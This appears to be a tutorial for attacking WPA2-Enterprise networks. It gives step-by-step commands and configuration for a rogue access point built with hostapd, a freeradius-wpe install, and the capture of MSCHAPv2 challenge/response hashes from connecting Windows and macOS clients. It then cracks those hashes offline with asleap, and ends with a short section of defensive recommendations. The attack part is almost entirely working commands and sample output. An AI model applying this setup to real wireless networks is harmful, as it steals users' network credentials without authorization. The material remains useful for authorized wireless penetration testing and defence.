... trying to abuse wpa-enterprise which is using freeradius as authentication.
...
... we will set up an rogue ap of the fake name "Rokeya". and on the web portal
... of the ap we will configure wpa-enterprise for the security mode.
... and on the EAP(802.1x) section we will put our attackers ip address for the
... radius server ip address, will set radius server shared secret as "test" and
... enable the mac address authentication.

... if we dont have any physical access-point to set up then what we can do is
... can set up an ap with the wireless lan card associated with our laptop with
... a package hostapd.

 # apt-get install hostapd
 # pwd
/etc/hostapd

 # ls
hostapd.conf  ifupdown.sh

 # cat -n hostapd.conf

     1	interface=wlan0
     2	driver=nl80211
     3	ssid=Rokeya
     4	logger_stdout=-1
     5	logger_stdout_level=0
     6	dump_file=/tmp/hostapd.dump
     7	ieee8021x=1
     8	eapol_key_index_workaround=0
     9	own_ip_addr=127.0.0.1
    10	auth_server_addr=127.0.0.1
    11	auth_server_port=1812
    12	auth_server_shared_secret=testing123
    13	wpa_passphrase=wifi123
    14	wpa=1
    15	wpa_key_mgmt=WPA-EAP
    16	channel=1
    17	wpa_pairwise=TKIP CCMP


... now we will start hostapd

 # hostapd /etc/hostapd/hostapd.conf

... this will create one ap of name Rokeya. note the hostapd.conf file it is pointing
... the authentication server as it self 127.0.0.1. for eap hacking testing we can
... install the following.

... installing freeradius-wpe and configuring it.

 # wget https://github.com/brad-anton/freeradius-wpe/raw/master/freeradius-server-wpe_2.1.12-1_i386.deb
 # dpkg --install freeradius-server-wpe_2.1.12-1_i386.deb
 # ldconfig

... configure the certificates

 # cd /usr/local/etc/raddb/certs/
 # ./bootstrap

... now run the radius server

 # radiusd -v

... so our freeradius-wpe installation has been complete. now we will configure it
... as our requirement. we will just set the default_eap_type=peap in eap.conf file
... list below and leave the rest of the file as it is.

 # pwd
 /usr/local/etc/raddb

 # vi eap.conf
default_eap_type=peap

... and also add "default_eap_type=mschapv2" in the peap section of eap.conf file.

 # vi client.conf
client 192.168.1.0/24 {
	secret		= testing123
}

... now we will start the radius like below.

 # radiusd -s -X

... if you find the following error then just make sure the radiusd directory is
... present on /usr/local/var/run. if not then make radiusd directory with the
... mkdir command.

Failed binding to /usr/local/var/run/radiusd/radiusd.sock: No such file or directory

... we may also include the "with_ntdomain_hack = yes" line in the module/mschap file

... now as we have radius running we will know keep our eye on radius log file if
... any windows client is trying to connect. if so we will get output similar like
... following

 # tail -f /usr/local/var/log/radius/freeradius-server-wpe.log

username: test
challenge: 1b:0a:dd:d9:e6:50:5c:e7
response: de:f3:a8:1f:7e:3c:43:db:04:f8:a0:75:ce:53:53:ca:70:35:71:76:2d:0c:e6:b5

... now to conduct one dictionary attack on this we can use the tools asleap coming
... with kali/backtrack like below.

 # asleap -C <challenge> -R <response> -W <wordlist>

... eap-ttls which is enable by default in eap.conf file is used by osx. the same
... attack like peap is also applicable for them too.

.... consideration on wpa-enterprise

... SOHOs and medium-sized businesses, use WPA2-PSK with a strong passphrase.
... For large enterprises, use WPA2-Enterprise with EAP-TLS. This uses both client and
... server-side certificates for authentication, and currently is unbreakable.
... If you have to use PEAP or EAP-TTLS with WPA2-Enterprise, then ensure that
... certificate validation is turned on, the right certifying authorities are chosen, the
... radius servers that are authorized are used and finally any setting that allows users
... to accept new Radius servers, certificates, or certifying authorities is turned off.
